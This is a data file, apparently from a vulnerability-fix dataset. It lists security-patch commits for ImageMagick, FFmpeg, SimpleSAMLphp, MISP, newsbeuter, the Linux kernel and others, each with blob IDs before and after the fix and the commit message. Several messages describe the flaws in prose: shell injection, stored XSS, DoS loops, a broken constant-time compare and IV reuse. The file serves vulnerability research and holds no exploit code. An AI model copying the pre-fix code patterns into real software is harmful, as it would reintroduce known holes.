======================================================================
Commit With Fix: 
    a33f7498f9052b50e8fe8c8422a11ba84474cb42
File(s) In Commit: 
    coders/dcm.c
Blob(s) In Commit: 
    55377c4f9cc1ffe20f14809c6e04d8d7e21531c2
Blob(s) Before Fix: 
    08d497f002be8a4a5d13e25e4ab139ae335d16f8
Projects:
    2016repotsheyue_ImageMagick
Commit Message for a33f7498f9052b50e8fe8c8422a11ba84474cb42:
https://github.com/ImageMagick/ImageMagick/issues/551

======================================================================
Commit With Fix: 
    cb9f07d9dcd791b63e622da43f7b232adaec0a9a
File(s) In Commit: 
    taglib/mpeg/id3v2/id3v2framefactory.cpp
Blob(s) In Commit: 
    9347ab86972a32ea31229dfd719f8a4f0cd84947
Blob(s) Before Fix: 
    0fbb87d026cdeaf599709e91f87866f70ee3336d
    3371ca7ddb9797334ecd45b79ba911ab1405011b
    759a9b7be6737da28f933fa19c17f706f21e22f2
    ad5983320eae7de6f969396c17e2769d692d05f9
Projects:
    121340129_taglib
Commit Message for cb9f07d9dcd791b63e622da43f7b232adaec0a9a:
Don't assume TDRC is an instance of TextIdentificationFrame (#831)\n\nIf TDRC is encrypted, FrameFactory::createFrame() returns UnknownFrame  which causes problems in rebuildAggregateFrames() when it is assumed  that TDRC is a TextIdentificationFrame

======================================================================
Commit With Fix: 
    6013ca1c83bf232008f7be815c0e4821fb6b120a
File(s) In Commit: 
    qa-include/qa-install.php
Blob(s) In Commit: 
    4c11d211c92900df9b21a5716eafdf1143d5f221
Blob(s) Before Fix: 
    8ada9f784d5d615f9d3368bab909b82c9b4f8056
Projects:
    0xhacking_question2answer
Commit Message for 6013ca1c83bf232008f7be815c0e4821fb6b120a:
Security fix in qa-install.php

======================================================================
Commit With Fix: 
    4bc629658e7b7d17c9ac3fe0da7dc5df71f1b85e
File(s) In Commit: 
    lib/SimpleSAML/Utils/Crypto.php
Blob(s) In Commit: 
    c7d16921a5248322c65de9cf7238dcc87b783cb8
Blob(s) Before Fix: 
    e9e229565d5592adaf7480a428799886b8045116
Projects:
    01000101_simplesamlphp
Commit Message for 4bc629658e7b7d17c9ac3fe0da7dc5df71f1b85e:
bugfix: SimpleSAML\Utils\Crypto returns true for different strings using PHP < 5.6.\n\nThe reason was the lack of conversion to integer for each character of the strings before applying the XOR operator to them. The operator returns always an empty string when applied to two characters, and applying a binary-wise OR between 0 and an empty string, yields 0. Therefore, $diff is always 0, and the function returns true for every two strings with same length, regardless of their contents.

======================================================================
Commit With Fix: 
    77df6a932d46daa35e364925eb73a175010dc904
File(s) In Commit: 
    lib/SimpleSAML/Utils/Crypto.php
Blob(s) In Commit: 
    22335b3235932e7878408b690b886b4198f7748f
Blob(s) Before Fix: 
    269ed1b4df54ca44031ddb044d84b4de6b048945
    d704a6241db98a134bd5664010558ec1b14e6b14
    d8a3356d1ec3657ea5fc008072dd58a54a4be83b
Projects:
    01000101_simplesamlphp
Commit Message for 77df6a932d46daa35e364925eb73a175010dc904:
Fix an issue with IV generation in SimpleSAML\Utils\Crypto::aesEncrypt().\n\nIVs must be random and one-time (never reused). Additionally, by deriving it from the key, the key length was effectively reduced to 128 bits.

======================================================================
Commit With Fix: 
    90dca835158495b173808273e7df127303b8b953
File(s) In Commit: 
    modules/saml/lib/IdP/SAML2.php
Blob(s) In Commit: 
    3a5ae0fbffdae1809810027584c39f3fb9024957
Blob(s) Before Fix: 
    158cdd21b1cadbc72d0486c31280ab54cb997fc8
    243ae742fed5696c6db556c2589d45571fc86732
    507570ef54e850473efc4a7a41d8887d7efa881d
    a752f025b4938f662a12a482ddc8978126dbecf4
    e48b3eada12cff4175513ce28da4c1abbaacbbdb
    f7b45d1d1db9f25821afc6841ef9f0fe77640bc2
Projects:
    01000101_simplesamlphp
Commit Message for 90dca835158495b173808273e7df127303b8b953:
bugfix: Make sure a persistent NameID is not generated by default when the UserID is missing in the state array.\n\nThis allowed misconfigured IdPs (i.e. those without both a PersistenNameID authproc filter, a “userid.attribute” configuration option and no “eduPersonPrincipalName” attribute available after running all the authentication processing filters) to generate a persistent NameID based on “null”, effectively giving all users the same identifier.

======================================================================
Commit With Fix: 
    1cc6f0ccc92c20c7cab6c4a7335daf29c91f0d8e
File(s) In Commit: 
    MagickCore/enhance.c
Blob(s) In Commit: 
    dba7880553faeb0fdc57e7d82e52d9eea68c7ed6
Blob(s) Before Fix: 
    951eb0c308120e2b835238cc87a0d512060b6fb2
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 1cc6f0ccc92c20c7cab6c4a7335daf29c91f0d8e:
https://github.com/ImageMagick/ImageMagick/issues/663 https://github.com/ImageMagick/ImageMagick/issues/655

======================================================================
Commit With Fix: 
    04178de2247e353fc095846784b9a10fefdbf890
File(s) In Commit: 
    coders/mat.c
Blob(s) In Commit: 
    fc8da2b144d7c8b08e25b6b110c0db52f0eaeb3a
Blob(s) Before Fix: 
    e3b80f14b9c29623785f385e11cef293d8be7ad0
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 04178de2247e353fc095846784b9a10fefdbf890:
https://github.com/ImageMagick/ImageMagick/issues/662

======================================================================
Commit With Fix: 
    96e9506ae9e252c548665152d1b8968297128307
File(s) In Commit: 
    src/controller.cpp
Blob(s) In Commit: 
    40db06c59dcfa90f59a3306f515593b579b3db1d
Blob(s) Before Fix: 
    a712a77692d55c94509704df2fa7a4ce4d3a221a
    fde8513b63e86c18b7f36ee05f7fd4db1970cf25
Projects:
    2ion_newsbeuter
Commit Message for 96e9506ae9e252c548665152d1b8968297128307:
Sanitize inputs to bookmark-cmd (#591)\n\nNewsbeuter didn't properly shell-escape the arguments passed to bookmarking command, which allows a remote attacker to perform remote code execution by crafting an RSS item whose title and/or URL contain something interpretable by the shell (most notably subshell invocations.)\n\nThis has been reported by Jeriko One <jeriko.one@gmx.us>, complete with PoC and a patch.\n\nThis vulnerability was assigned CVE-2017-12904.

======================================================================
Commit With Fix: 
    a00b684465b38d722ca9a3543b8af8568e6bad5c
File(s) In Commit: 
    tls/src/main/java/org/bouncycastle/tls/crypto/impl/jcajce/JceDefaultTlsCredentialedDecryptor.java
Blob(s) In Commit: 
    cea1df8b9faee7804b6326d6e288cc4bbb56a442
Blob(s) Before Fix: 
    3a8819ca1ade83c684628af2d66dcb27371247ba
    c4ab53206f8fcfbb74f4236d4d71d67520c76a25
Projects:
    0xPagliacci_bc-java
Commit Message for a00b684465b38d722ca9a3543b8af8568e6bad5c:
Confirm size of decrypted PMS before using

======================================================================
Commit With Fix: 
    d072ed6aff835c174e856ce3a428163c0da9e8f4
File(s) In Commit: 
    coders/png.c
Blob(s) In Commit: 
    ea6dce6ab5f862a70a5ef5c2287127ded3125930
Blob(s) Before Fix: 
    d6d33ee3603e00056e5fb874fadcc177fe6b5feb
Projects:
    2016repotsheyue_ImageMagick
Commit Message for d072ed6aff835c174e856ce3a428163c0da9e8f4:
Skip MNG CLIP chunk with out-of-range object IDs

======================================================================
Commit With Fix: 
    51b0ae01709adc1e4a9245e158ef17b85a110960
File(s) In Commit: 
    coders/mat.c
Blob(s) In Commit: 
    cf2190bf373a28e1ee6008ba2d33c8e0cc0779fc
Blob(s) Before Fix: 
    7b4c07453ee8100dcacedc4a9d37cfc71d2add97
    e1623a82e8bf54eb0c2b6bf02cc4b9eb0686e957
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 51b0ae01709adc1e4a9245e158ef17b85a110960:
https://github.com/ImageMagick/ImageMagick/issues/362

======================================================================
Commit With Fix: 
    79e5dbcdd1fc2f714f9bae548bc55d5073f3ed20
File(s) In Commit: 
    coders/mat.c
Blob(s) In Commit: 
    48cde36e27d7fbe3e0215012229e53aefd0c0091
Blob(s) Before Fix: 
    1ff235448de0d3a0b883c1ff968cbab9dcb46269
    b5a3f1f970dea5fb26392babc57bc8c68ca16d00
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 79e5dbcdd1fc2f714f9bae548bc55d5073f3ed20:
...

======================================================================
Commit With Fix: 
    e5c063a1007506ba69e97a35effcdef944421c89
File(s) In Commit: 
    coders/mat.c
Blob(s) In Commit: 
    be646a008168df92966ddaa3fc8806ff1c61311d
Blob(s) Before Fix: 
    1f4a5af73e8ca46c4150654e57cbade090480f4e
Projects:
    2016repotsheyue_ImageMagick
Commit Message for e5c063a1007506ba69e97a35effcdef944421c89:
https://github.com/ImageMagick/ImageMagick/issues/598

======================================================================
Commit With Fix: 
    6eba658d4a648b41b357025d864c19a67412b8aa
File(s) In Commit: 
    app/View/Helper/CommandHelper.php
Blob(s) In Commit: 
    4adbaad7c190e9b1a3f4c5789dd041d377d11ae8
Blob(s) Before Fix: 
    fd563a2b10f15ab29b67a9f0e492ad5e6e5b6d72
Projects:
    0-vortex_MISP
Commit Message for 6eba658d4a648b41b357025d864c19a67412b8aa:
fix: Fixed a potential persistent cross site scripting in the comments\n\n- new tag parser for the comments implemented - Parser now cleanly pre-constructs the replacement items after finding tag pairs\n\n- This only impacts users of the same instance, as comments are not synchronised\n\n- as reported by Jurgen Jans and Cedric Van Bockhaven from Deloitte

======================================================================
Commit With Fix: 
    bc3aae2bbac46dd894c89db5d5e98f7f0ef9e205
File(s) In Commit: 
    net/ipv4/route.c
Blob(s) In Commit: 
    2331de20ca505d7f25fe9d93d5320e9e39af6c39
Blob(s) Before Fix: 
    02c62299d717b9f6c38a5227e3b3ae376e0015b6
    0383e66f59bcef3bd6b8627edae9aa2d34139f5d
    22ba873546c3c4463f1b9ab7022ca3a4f7926c81
    2a57566e6e91947d459ae8908374539b83fc3a9d
    6263af2f6ce8971f34442a3e307a5fc450121061
    62d4d90c1389c4ea7da37c81779b2f55207d2a92
    655d9eebe43e16a59102edcd3ea4bc177c6b341d
    6883b3d4ba8f69de2cb924612d60f5671a219a84
    709ffe67d1de1609be7d3e4a98d9314b01e5f265
    7effa62beed3fa9065ab7d6365b1d79143bfae79
    804bead564db8e08d756fa11ef1981f3908396c1
    8471dd116771462d149e1da2807e446b69b74bcc
    8ea0735a67546b745c2ef5ecd7dd0b5d06a22c77
    9b38cf18144e4f49aa0bd88ca3d8b3b2d3952e33
    a1f2830d811025e561c9739c79a5c218a3801977
    c816cd53f7fc26372d79a8ce063ca2e4da5d5705
    cb494a5050f7a9d7cbfc7d961ee5ae0d66196be7
    d9724889ff09077aa88c98ec3e170dcfdb91d29b
    fe877a4a72b1ec4cea0b4f78c419aedbcfa5dcdb
Projects:
    0-T-0_ps4-linux
Commit Message for bc3aae2bbac46dd894c89db5d5e98f7f0ef9e205:
net: check and errout if res->fi is NULL when RTM_F_FIB_MATCH is set\n\nSyzkaller hit 'general protection fault in fib_dump_info' bug on commit 4.13-rc5..\n\nGuilty file: net/ipv4/fib_semantics.c\n\nkasan: GPF could be caused by NULL-ptr deref or user memory access general protection fault: 0000 [#1] SMP KASAN Modules linked in: CPU: 0 PID: 2808 Comm: syz-executor0 Not tainted 4.13.0-rc5 #1 Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014 task: ffff880078562700 task.stack: ffff880078110000 RIP: 0010:fib_dump_info+0x388/0x1170 net/ipv4/fib_semantics.c:1314 RSP: 0018:ffff880078117010 EFLAGS: 00010206 RAX: dffffc0000000000 RBX: 00000000000000fe RCX: 0000000000000002 RDX: 0000000000000006 RSI: ffff880078117084 RDI: 0000000000000030 RBP: ffff880078117268 R08: 000000000000000c R09: ffff8800780d80c8 R10: 0000000058d629b4 R11: 0000000067fce681 R12: 0000000000000000 R13: ffff8800784bd540 R14: ffff8800780d80b5 R15: ffff8800780d80a4 FS:  00000000022fa940(0000) GS:ffff88007fc00000(0000) knlGS:0000000000000000 CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033 CR2: 00000000004387d0 CR3: 0000000079135000 CR4: 00000000000006f0 Call Trace:   inet_rtm_getroute+0xc89/0x1f50 net/ipv4/route.c:2766   rtnetlink_rcv_msg+0x288/0x680 net/core/rtnetlink.c:4217   netlink_rcv_skb+0x340/0x470 net/netlink/af_netlink.c:2397   rtnetlink_rcv+0x28/0x30 net/core/rtnetlink.c:4223   netlink_unicast_kernel net/netlink/af_netlink.c:1265 [inline]   netlink_unicast+0x4c4/0x6e0 net/netlink/af_netlink.c:1291   netlink_sendmsg+0x8c4/0xca0 net/netlink/af_netlink.c:1854   sock_sendmsg_nosec net/socket.c:633 [inline]   sock_sendmsg+0xca/0x110 net/socket.c:643   ___sys_sendmsg+0x779/0x8d0 net/socket.c:2035   __sys_sendmsg+0xd1/0x170 net/socket.c:2069   SYSC_sendmsg net/socket.c:2080 [inline]   SyS_sendmsg+0x2d/0x50 net/socket.c:2076   entry_SYSCALL_64_fastpath+0x1a/0xa5   RIP: 0033:0x4512e9   RSP: 002b:00007ffc75584cc8 EFLAGS: 00000216 ORIG_RAX:   000000000000002e   RAX: ffffffffffffffda RBX: 0000000000000002 RCX: 00000000004512e9   RDX: 0000000000000000 RSI: 0000000020f2cfc8 RDI: 0000000000000003   RBP: 000000000000000e R08: 0000000000000000 R09: 0000000000000000   R10: 0000000000000000 R11: 0000000000000216 R12: fffffffffffffffe   R13: 0000000000718000 R14: 0000000020c44ff0 R15: 0000000000000000   Code: 00 0f b6 8d ec fd ff ff 48 8b 85 f0 fd ff ff 88 48 17 48 8b 45   28 48 8d 78 30 48 b8 00 00 00 00 00 fc ff df 48 89 fa 48 c1 ea 03   <0f>   b6 04 02 84 c0 74 08 3c 03 0f 8e cb 0c 00 00 48 8b 45 28 44   RIP: fib_dump_info+0x388/0x1170 net/ipv4/fib_semantics.c:1314 RSP:   ffff880078117010 ---[ end trace 254a7af28348f88b ]---\n\nThis patch adds a res->fi NULL check.\n\nexample run: $ip route get 0.0.0.0 iif virt1-0 broadcast 0.0.0.0 dev lo     cache <local,brd> iif virt1-0\n\n$ip route get 0.0.0.0 iif virt1-0 fibmatch RTNETLINK answers: No route to host\n\nReported-by: idaifish <idaifish@gmail.com> Reported-by: Dmitry Vyukov <dvyukov@google.com> Fixes: b61798130f1b ("net: ipv4: RTM_GETROUTE: return matched fib result when requested") Signed-off-by: Roopa Prabhu <roopa@cumulusnetworks.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    a6e544b0a88b53114bfa5a57e21b7be7a8dfc9d0
File(s) In Commit: 
    net/core/flow_dissector.c
Blob(s) In Commit: 
    22f3d768b45925d03beecb5715c419b25fde09bf
Blob(s) Before Fix: 
    151b6e48b81f1d99020e710672f8b8134f82dda7
Projects:
    0-T-0_ps4-linux
Commit Message for a6e544b0a88b53114bfa5a57e21b7be7a8dfc9d0:
flow_dissector: Jump to exit code in __skb_flow_dissect\n\nInstead of returning immediately (on a parsing failure for instance) we jump to cleanup code. This always sets protocol values in key_control (even on a failure there is still valid information in the key_tags that was set before the problem was hit).\n\nSigned-off-by: Tom Herbert <tom@herbertland.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    124eb202e70678539544f6268efc98131f19fa49
File(s) In Commit: 
    libavformat/rmdec.c
Blob(s) In Commit: 
    d6d7d9cd8414da5030021d513eebf943c69238ca
Blob(s) Before Fix: 
    09889f6efa6b2f8a50753a35201fd4e4502d5562
    1775d6cdfb110411591bc2df2784121dcd50ea95
    178eaea57d89dd04d8c04d59101d047ac0daa4b6
    2e93f1d4e86f0aed74862d9714d4673ce82a81ee
    4d565291af2506fdeccce9de5c3806dc90bebb52
    727d065b8f30cbb154511a21f5dd1adda809ec45
    c8035889390968df9a67cb930a1ae4ee4fa1fb3d
    cb0481ed4d9f471a8952a3eda0923fe6e9849e22
    d1758628ad667a4dda9e1585be1f9cfbcfa78896
Projects:
    00ERNEST00_FFmpeg
Commit Message for 124eb202e70678539544f6268efc98131f19fa49:
avformat/rmdec: Fix DoS due to lack of eof check\n\nFixes: loop.ivr\n\nFound-by: Xiaohei and Wangchu from Alibaba Security Team Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    4f05e2e2dc1a89f38cd9f0960a6561083d714f1e
File(s) In Commit: 
    libavformat/mvdec.c
Blob(s) In Commit: 
    f7aa4cbaecf863ac11a76ec677a0bd24d53253ca
Blob(s) Before Fix: 
    0e12c8c6c18a1f10eb910bffbcbd6f383a28b389
    52c5355e6a9fa39117dd96c9c5573eaa2c0e4948
    6e7c3ffd113cbc16225ccb9106d4e173bcada4a2
    7aa6452f66daaa5a35391d5e574a45b52c524543
    80ef4b1569aa83c161cdf02b54f32a4f63b508f6
    f0a29ebe5750d9d720b6ab35ffe61842351ac10d
    fa596179ed97ab8fd25d07bacaee0ad4a98153b4
Projects:
    00ERNEST00_FFmpeg
Commit Message for 4f05e2e2dc1a89f38cd9f0960a6561083d714f1e:
avformat/mvdec: Fix DoS due to lack of eof check\n\nFixes: loop.mv\n\nFound-by: Xiaohei and Wangchu from Alibaba Security Team Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    96f24d1bee7fe7bac08e2b7c74db1a046c9dc0de
File(s) In Commit: 
    libavformat/rl2.c
Blob(s) In Commit: 
    eb1682dfcb7c2983a9a5c06175aac0e470c9e357
Blob(s) Before Fix: 
    0bec8f1d9aba8b850a089c25315e1228591b59fb
    0e8d346a37fb10fe3e29add8ae3e854a8908731e
    1b7edce82456b5923d41599191a44c95ec426ee0
    5017016644c5ba386deb5dc01553fe9cb7d2f710
    d354339ea31c3bd6f69f048bd944e6667bda2695
    d847d9aaa88a7e7d036146f26e85b7cd51ba3187
    fe3658d88f652f5974b71348c868bf55d49ecffe
Projects:
    00ERNEST00_FFmpeg
Commit Message for 96f24d1bee7fe7bac08e2b7c74db1a046c9dc0de:
avformat/rl2: Fix DoS due to lack of eof check\n\nFixes: loop.rl2\n\nFound-by: Xiaohei and Wangchu from Alibaba Security Team Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    7f9ec5593e04827249e7aeb466da06a98a0d7329
File(s) In Commit: 
    libavformat/asfdec_f.c
Blob(s) In Commit: 
    f3acbae2801b773dd68ee5245bff384530456a1e
Blob(s) Before Fix: 
    be09a92bd1e2633fe6452d77ba0a4c4799885f10
Projects:
    00ERNEST00_FFmpeg
Commit Message for 7f9ec5593e04827249e7aeb466da06a98a0d7329:
avformat/asfdec: Fix DoS due to lack of eof check\n\nFixes: loop.asf\n\nFound-by: Xiaohei and Wangchu from Alibaba Security Team Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    7e80b63ecd259d69d383623e75b318bf2bd491f6
File(s) In Commit: 
    libavformat/cinedec.c
Blob(s) In Commit: 
    de34fb963820188a8c9965263978cb4a408d33d9
Blob(s) Before Fix: 
    003ca519bcdd37928853a556bfef1d85281cc2f5
    0efedda1a351681d2bf79720edf8a153b4c30da2
    1497842cf24935c08bd55321cdc486105795b5da
    318408436f391fcb9e6aab9ae36616c0171dd9b7
    32cccf566b4fbbb5550603dd99e2f2498cf7ed7d
    372088495e12d69ab5cfcdfd497e1477658018a3
    632f46c454cd105099b040edc22d8a90429fb45d
    763b93ba2e178956bef1984ad06b011758699089
    d27ebbba7bf949c049ac1228d88a75f325404992
Projects:
    00ERNEST00_FFmpeg
Commit Message for 7e80b63ecd259d69d383623e75b318bf2bd491f6:
avformat/cinedec: Fix DoS due to lack of eof check\n\nFixes: loop.cine\n\nFound-by: Xiaohei and Wangchu from Alibaba Security Team Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    499350a5a6e7512d9ed369ed63a4244b6536f4f8
File(s) In Commit: 
    net/ipv4/tcp.c
Blob(s) In Commit: 
    842b575f8fdddc41a41aa6f03fb9086cec7ee451
Blob(s) Before Fix: 
    032a96d78c99deda3b3298a305298f92776e2500
    1e319a525d51b0b603a5ccc5143381c752b9f2c7
    1e4c76d2b8278ba71d6cc2cf7ebfe483e241f76e
    40ba4249a58677671b68bf495f32f15b7c5f62d7
    4804645bdf0200eadf82ba27914edc09bbe24ac5
    814af89c1bd3418130e0ad90def6623ca13a6d16
    cf4555581282c608f920254078264e36e18584c6
Projects:
    0-T-0_ps4-linux
Commit Message for 499350a5a6e7512d9ed369ed63a4244b6536f4f8:
tcp: initialize rcv_mss to TCP_MIN_MSS instead of 0\n\nWhen tcp_disconnect() is called, inet_csk_delack_init() sets icsk->icsk_ack.rcv_mss to 0. This could potentially cause tcp_recvmsg() => tcp_cleanup_rbuf() => __tcp_select_window() call path to have division by 0 issue. So this patch initializes rcv_mss to TCP_MIN_MSS instead of 0.\n\nReported-by: Andrey Konovalov  <andreyknvl@google.com> Signed-off-by: Wei Wang <weiwan@google.com> Signed-off-by: Eric Dumazet <edumazet@google.com> Signed-off-by: Neal Cardwell <ncardwell@google.com> Signed-off-by: Yuchung Cheng <ycheng@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    197e7e521384a23b9e585178f3f11c9fa08274b9
File(s) In Commit: 
    mm/migrate.c
Blob(s) In Commit: 
    e84eeb4e43566c7b1ee85e3759b1b60b72c1c532
Blob(s) Before Fix: 
    051cc1555d36e34f4734a7e54faac1a6c2fe144c
    1236449b4777be3cf61e8cd68616c2c3faa5fd9f
    2586d5ab9b9956a8c1ee9e20f6e160a78442c84d
    2c63ac06791bbdf0e382e669812fcca67bf3cc55
    389c624a9c3fde0bd37f4aeef50d55c6ae726d13
    3ad0fea5c4387c5b6ff1d8fb513b73488b9180f2
    4d0be47a322a8a33491c94072100ebcec829becd
    568284ec75d419863866f43065003883b8d81939
    62767155187356d54d1fa7333ad402e76183ca0b
    63f0cd5599997ef8d1a42110c1fc9ccd6d920ac1
    738f1d5f83503e546960d005a034abf2dde2c0e7
    842ecd7aaf7fa6ac1371f6137dc155c91851505c
    87f4d0f818194ea68cd323b1bcf84dd430b826a3
    89a0a1707f4c67deb77dc466cb6f5c2ecfe19051
    99250aee1ac166fd8d5bb03849041b2a07fc3f80
    9a0897a14d37be3d7759d577f98060fa75c7be0f
    bd3fdc202e8be19411d641dcfdf5addd8c358944
    c509a92639f69f6dd8a46072e685e705b3421b58
    d68a41da6abb0743d6b09cc49c5c9524463715c3
    e9594bc0d4069fff2905855efa1ac532a488632c
    ed97c2c14fa80b47ffbf7fa22ec6d4b9b57202b1
    f7ee04a5ae27a2934de9fab746667597bffafef3
Projects:
    0-T-0_ps4-linux
Commit Message for 197e7e521384a23b9e585178f3f11c9fa08274b9:
Sanitize 'move_pages()' permission checks\n\nThe 'move_paghes()' system call was introduced long long ago with the same permission checks as for sending a signal (except using CAP_SYS_NICE instead of CAP_SYS_KILL for the overriding capability).\n\nThat turns out to not be a great choice - while the system call really only moves physical page allocations around (and you need other capabilities to do a lot of it), you can check the return value to map out some the virtual address choices and defeat ASLR of a binary that still shares your uid.\n\nSo change the access checks to the more common 'ptrace_may_access()' model instead.\n\nThis tightens the access checks for the uid, and also effectively changes the CAP_SYS_NICE check to CAP_SYS_PTRACE, but it's unlikely that anybody really _uses_ this legacy system call any more (we hav ebetter NUMA placement models these days), so I expect nobody to notice.\n\nFamous last words.\n\nReported-by: Otto Ebeling <otto.ebeling@iki.fi> Acked-by: Eric W. Biederman <ebiederm@xmission.com> Cc: Willy Tarreau <w@1wt.eu> Cc: stable@kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    9d00fb9d70ee8c0cc7002b89318c5be00f1bbdad
File(s) In Commit: 
    libavformat/mxfdec.c
Blob(s) In Commit: 
    91731a7533c157c3be48678fd51be5ac43139320
Blob(s) Before Fix: 
    0affca97a2b5f3929add395143237877d4a6ca01
    2ad0c288f89d3d3c1e13888b1208912e1eb591fb
    6adb77d81fbf203bfae31f5f4cf920777fea1b58
    f8d0f9e0570bb99796d054d1222c85a86858c798
Projects:
    00ERNEST00_FFmpeg
Commit Message for 9d00fb9d70ee8c0cc7002b89318c5be00f1bbdad:
avformat/mxfdec: Fix Sign error in mxf_read_primer_pack()\n\nFixes: 20170829B.mxf\n\nCo-Author: 张洪亮(望初)" <wangchu.zhl@alibaba-inc.com> Found-by: Xiaohei and Wangchu from Alibaba Security Team Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    900f39692ca0337a98a7cf047e4e2611071810c2
File(s) In Commit: 
    libavformat/mxfdec.c
Blob(s) In Commit: 
    6adb77d81fbf203bfae31f5f4cf920777fea1b58
Blob(s) Before Fix: 
    f8d0f9e0570bb99796d054d1222c85a86858c798
Projects:
    00ERNEST00_FFmpeg
Commit Message for 900f39692ca0337a98a7cf047e4e2611071810c2:
avformat/mxfdec: Fix DoS issues in mxf_read_index_entry_array()\n\nFixes: 20170829A.mxf\n\nCo-Author: 张洪亮(望初)" <wangchu.zhl@alibaba-inc.com> Found-by: Xiaohei and Wangchu from Alibaba Security Team Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    c24bcb553650b91e9eff15ef6e54ca73de2453b7
File(s) In Commit: 
    libavformat/nsvdec.c
Blob(s) In Commit: 
    d8ce656817cab7009362d692fee25d14d006f772
Blob(s) Before Fix: 
    44e5097d59a9ab800e9738dedd5ca8a2746573f2
    4a749a2feb328bf2ffde456fbf4d7985ae2243ae
    507fb396a51e44b992e7ae99a5316e595afca4a7
    59b79382007fea5178eda4db4e6260907a2b1fb4
    924c8694b136890d8e0c8d4f07fc3ce225b1b683
    92f7d178f68887e4fbee9c77f9a60d32bf07344c
    c6c35923457731dd2b8a4178c173e4b105543004
    c6ddb67bbddcb7797844f3c5f5dfb08105396804
    c91d2a15dd985db76e6cf0d51c59f9e87ca58512
    de55396508816771a5c69d46447a5473e1b97cf6
Projects:
    00ERNEST00_FFmpeg
Commit Message for c24bcb553650b91e9eff15ef6e54ca73de2453b7:
avformat/nsvdec: Fix DoS due to lack of eof check in nsvs_file_offset loop.\n\nFixes: 20170829.nsv\n\nCo-Author: 张洪亮(望初)" <wangchu.zhl@alibaba-inc.com> Found-by: Xiaohei and Wangchu from Alibaba Security Team Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    bdbbb13f1fe9b7e2465502c500561720f7456aac
File(s) In Commit: 
    coders/ps.c
Blob(s) In Commit: 
    abe3a23eaaeb0e1b7eac1da6bb79ecd2756d7559
Blob(s) Before Fix: 
    57032275724ceed31955e038ee0e845455c04fc4
Projects:
    2016repotsheyue_ImageMagick
Commit Message for bdbbb13f1fe9b7e2465502c500561720f7456aac:
https://github.com/ImageMagick/ImageMagick/issues/715

======================================================================
Commit With Fix: 
    50f54462076648ac2e36c3f58f4dadd4babbf1c9
File(s) In Commit: 
    coders/txt.c
Blob(s) In Commit: 
    051f6bef2b22cbe80632c426621066104b4ebb06
Blob(s) Before Fix: 
    16e7ac2e94c7f7a0925e3eadc2fe2128b07c5ae2
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 50f54462076648ac2e36c3f58f4dadd4babbf1c9:
https://github.com/ImageMagick/ImageMagick/issues/713

======================================================================
Commit With Fix: 
    d9a8234d211da30baf9526fbebe9a8438ea7e11c
File(s) In Commit: 
    coders/xbm.c
Blob(s) In Commit: 
    ea2f76bf96218f6b11f80cb3fcb2edb8f04460ec
Blob(s) Before Fix: 
    ce73160e3385fa62f36aba7c0d08c6d5fcb16ede
Projects:
    2016repotsheyue_ImageMagick
Commit Message for d9a8234d211da30baf9526fbebe9a8438ea7e11c:
https://github.com/ImageMagick/ImageMagick/issues/712

======================================================================
Commit With Fix: 
    9cb4eb772839c5e1de2855d126bf74ff16d13382
File(s) In Commit: 
    libavformat/mov.c
Blob(s) In Commit: 
    2519707345410938ebf220b57e601b5d0cc61bc3
Blob(s) Before Fix: 
    37afe79df029af9095e1e893a31e2a3f0f58bdd1
    3845e63b5359a135ea322acd28729dbdb2722019
    994e9c6ebafc11c000023bfe1e143ed9a19ef924
    c7caf80b11ced9bc6cc614e3dd0578f6c20488e7
    d5c39490502237ce26f9235ccce1dae64dd8b1b9
Projects:
    00ERNEST00_FFmpeg
Commit Message for 9cb4eb772839c5e1de2855d126bf74ff16d13382:
avformat/mov: Fix DoS in read_tfra()\n\nFixes: Missing EOF check in loop No testcase\n\nFound-by: Xiaohei and Wangchu from Alibaba Security Team Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    afc9c683ed9db01edb357bc8c19edad4282b3a97
File(s) In Commit: 
    libavformat/asfdec_f.c
Blob(s) In Commit: 
    cc648b9a2f05563a3b12b1c8a09ce4a77a536079
Blob(s) Before Fix: 
    2c81b138f2b5d7ddb5923a3f4379178d24d23e81
    be09a92bd1e2633fe6452d77ba0a4c4799885f10
    f3acbae2801b773dd68ee5245bff384530456a1e
Projects:
    00ERNEST00_FFmpeg
Commit Message for afc9c683ed9db01edb357bc8c19edad4282b3a97:
avformat/asfdec: Fix DoS in asf_build_simple_index()\n\nFixes: Missing EOF check in loop No testcase\n\nFound-by: Xiaohei and Wangchu from Alibaba Security Team Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    6bd33275368edfa71ae117de895488584678ac79
File(s) In Commit: 
    imap/mboxlist.c
Blob(s) In Commit: 
    dbee06c0f5f414c282d47aca8780ba9e34bda308
Blob(s) Before Fix: 
    413cdcebe59b0f2aad626a174517ad7527dc2b4e
Projects:
    25814916m_cyrus-imapd
Commit Message for 6bd33275368edfa71ae117de895488584678ac79:
mboxlist: fix uninitialised memory use where pattern is "Other Users"

======================================================================
Commit With Fix: 
    1d65ad6786282d23ba1865f56e2fd19188e7c26a
File(s) In Commit: 
    shibboleth.php
Blob(s) In Commit: 
